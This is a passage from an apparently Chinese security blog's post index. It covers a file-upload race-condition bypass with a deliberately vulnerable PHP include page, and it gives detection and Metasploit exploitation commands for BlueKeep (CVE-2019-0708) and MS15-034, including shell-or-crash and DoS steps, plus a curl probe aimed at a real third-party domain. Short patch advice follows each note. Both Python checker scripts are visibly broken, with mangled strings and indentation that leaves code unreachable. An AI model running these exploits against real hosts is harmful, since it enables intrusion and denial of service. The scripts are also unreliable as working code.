   <span class="keyword">case</span> -<span class="number">3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;setDir( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>上传图片马，通过条件竞争，图片马来不及改名就被上传了</p>
<p>可以在一定条件下免去查找新文件名</p>
<p>利用文件包含执行php代码</p>
<p>include.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=upload/xxx.jpg</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>





]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>文件上传漏洞</category>
      </categories>
      <tags>
        <tag>文件上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows(CVE-2019-0708)远程桌面代码执行漏洞</title>
    <url>//ddf32da2222d.html</url>
    <content><![CDATA[<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>&emsp;&emsp;2019年5月15日微软发布安全补丁修复了CVE编号为CVE-2019-0708的Windows远程桌面服务（RDP）远程代码执行漏洞,该漏洞在不需身份认证的情况下即可远程触发,危害与影响面极大。</p>
<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><ul>
<li>Windows 7</li>
<li>Windows server 2008 R2</li>
<li>Windows server 2008</li>
<li>Windows 2003</li>
<li>Windows xp</li>
</ul>
<p>注:Windows 8和windows10以及之后的版本不受此漏洞影响</p>
<h2 id="漏洞检测方式"><a href="#漏洞检测方式" class="headerlink" title="漏洞检测方式"></a>漏洞检测方式</h2><p><a href="https://github.com/Pa55w0rd/CVE-2019-0708" target="_blank">CVE-2019-0708批量检测工具</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install IPy</span><br><span class="line">cve-2019-0708_v1.py -t ip -p port -f file</span><br></pre></td></tr></table></figure>

<p><a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708检测工具</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cve-2019-0708-scan.exe ip port</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">通过MSF</button></li><li class="tab"><button type="button" data-href="#-2">使用POC</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@root:~/桌面# msfconsole</span><br><span class="line"></span><br><span class="line">msf5 &gt; search cve_2019_0708</span><br><span class="line">msf5 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; show options</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set RHOST IP</span><br><span class="line"># 设置目标IP</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set target 3</span><br><span class="line"># 3代表目标机器架构为VMware、2代表目标架构是virtulbox</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; run</span><br></pre></td></tr></table></figure>

<p>可能会反弹shell，也有概率会使目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p>POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install impacket</span><br><span class="line"></span><br><span class="line">crashpoc.py 192.168.1.1 64  #python3 crashpoc.py ip地址 系统类型</span><br></pre></td></tr></table></figure>

<p>执行POC会让目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>



<h2 id="漏洞修复方法"><a href="#漏洞修复方法" class="headerlink" title="漏洞修复方法"></a>漏洞修复方法</h2><p>1.<a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708补丁</a></p>
<p>2.安装安全管家类的软件</p>
<p>3.关闭远程桌面，开启防火墙</p>
<p>4.在远程设置里设置使用网络级别身份验证的远程桌面的计算机链接</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>操作系统漏洞</category>
        <category>远程代码执行漏洞</category>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>远程代码执行漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP.SYS远程执行代码漏洞(MS15-034)</title>
    <url>//2e5ad9caf81d.html</url>
    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞</p>
<p>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞</p>
<p>攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>任何安装了微软IIS 6.0以上的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Win Server 2008 R2</span><br><span class="line">Win Server 2012</span><br><span class="line">Win Server 2012 R2</span><br><span class="line">Win 7</span><br><span class="line">Win 8</span><br><span class="line">Win 8.1</span><br></pre></td></tr></table></figure>



<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">使用curl工具检测</button></li><li class="tab"><button type="button" data-href="#-2">使用python3检测域名</button></li><li class="tab"><button type="button" data-href="#-3">使用python3检测IP</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -i -H &quot;Range: bytes=0-18446744073709551615&quot; http://www.baidu.com</span><br></pre></td></tr></table></figure>

<p>如果服务器存在HTTP.SYS远程代码执行漏洞，那么响应状态应该有：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 416 Requested Range Not Satisfiable</span><br></pre></td></tr></table></figure>

<p>如果服务器打上了补丁，那么响应状态应该是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP Error 400. The request has an invalid header name.</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;;jastra&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bg_colors</span>:</span></span><br><span class="line">    VULN = <span class="string">&#x27;;33[92m&#x27;</span>;</span><br><span class="line">    NONVULN= <span class="string">&#x27;;33[95m&#x27;</span>;</span><br><span class="line">    EXPLOIT = <span class="string">&#x27;;33[91m&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">identify_iis</span>(<span class="params">domain</span>):</span></span><br><span class="line">    	req = requests.get(<span class="built_in">str</span>(domain))</span><br><span class="line">        remote_server = req.headers[<span class="string">&#x27;server&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Microsoft-IIS&#x27;</span> <span class="keyword">in</span> remote_server:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务是&#x27;</span> + remote_server)</span><br><span class="line">            ms15_034_test(<span class="built_in">str</span>(domain))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务器不是IIS\n可能是: &#x27;</span> + remote_server)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ms15_034_test</span>(<span class="params">domain</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;启动vuln检查!&#x27;</span>)</span><br><span class="line">        headers = &#123;<span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;stuff&#x27;</span>,<span class="string">&#x27;Range&#x27;</span>: <span class="string">&#x27;bytes=0-18446744073709551615&#x27;</span>&#125;</span><br><span class="line">        req = requests.get(<span class="built_in">str</span>(domain), headers = headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;Requested Range Not Satisfiable&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;存在HTTP.sys远程代码执行漏洞!&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">b&#x27;The request has an invalid header name&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;漏洞已修复&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;IIS服务无法显示漏洞是否存在，需要手动检测&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> __name__== <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        usr_domain = <span class="built_in">input</span>(<span class="string">&#x27;输入域名扫描: &#x27;</span>)</span><br><span class="line">        identify_iis(usr_domain)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">ipAddr = <span class="string">&quot;IP地址&quot;</span>                         <span class="comment"># 这里填写检测的IP</span></span><br><span class="line">hexAllFfff = <span class="string">&quot;18446744073709551615&quot;</span></span><br><span class="line"></span><br><span class="line">req1 = <span class="string">&quot;GET / HTTP/1.0\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">req = <span class="string">&quot;GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-&quot;</span> + hexAllFfff + <span class="string">&quot;\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Audit Started&quot;</span>)</span><br><span class="line"></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">client_socket.connect((ipAddr, <span class="number">80</span>))                     <span class="comment"># 可以手动更改端口</span></span><br><span class="line">client_socket.send(req1.encode())</span><br><span class="line">boringResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;Microsoft&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> boringResp:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[*] Not IIS&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">    client_socket.close()</span><br><span class="line">    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	client_socket.connect((ipAddr, <span class="number">80</span>))                 <span class="comment"># 可以手动更改端口</span></span><br><span class="line">	client_socket.send(req.encode())</span><br><span class="line">	goodResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&quot;Requested Range Not Satisfiable&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[!!] Looks VULN&quot;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="string">b&quot; The request has an invalid header name&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Looks Patched&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Unexpected response, cannot discern patch status&quot;</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>



<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><p>通过MSF</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">&gt;search ms 15-034</span><br><span class="line">&gt;auxiliary/scanner/http/ms15_034_http_sys_memory_dump      # 检测模块</span><br><span class="line">&gt;auxiliary/dos/http/ms15_034_ulonglongadd                # 攻击模块，可能导致蓝屏</span><br><span class="line">&gt;show options</span><br><span class="line">&gt;set RHOST IP</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>



<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.禁用IIS内核缓存</p>
<p>2.<a href='https://support.microsoft.com/zh-cn/kb/3042553' target='_blank'>官方补丁下载</a></p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>远程代码执行漏洞</category>
      </categories>
      <tags>
        <tag>远程代码执行漏洞</tag>
      </tags>
  </entry>
</search>
